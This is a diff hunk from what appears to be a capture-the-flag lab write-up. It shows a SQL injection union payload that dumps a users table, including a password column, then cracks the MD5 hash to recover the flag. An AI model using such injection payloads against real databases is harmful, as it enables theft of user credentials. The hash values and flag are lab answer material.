@@ -23,7 +23,7 @@ A union attack attempts to pull information from an additional table that is not
 >**user_id,first_name,last_name,town,country,planet,Commentaire,countersign**
 >4. Find data  
  >_1 and 1=2 union select 1,concat(user_id,first_name,last_name,town,country,planet,Commentaire,countersign) from users_  
- >**5FlagGetThe424242Decrypt this password -> then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28**  
+ <br>>**5FlagGetThe424242Decrypt this password -> then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28**  
  >_MD5 DECRYPT-> 5ff9d0165b4f92b14994e5c685cdce28 => FortyTwo_  
  > _toLower -> FortyTwo => fortytwo_  
  >_Sh256 ENCRYPT -> fortytwo => **10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5**_  
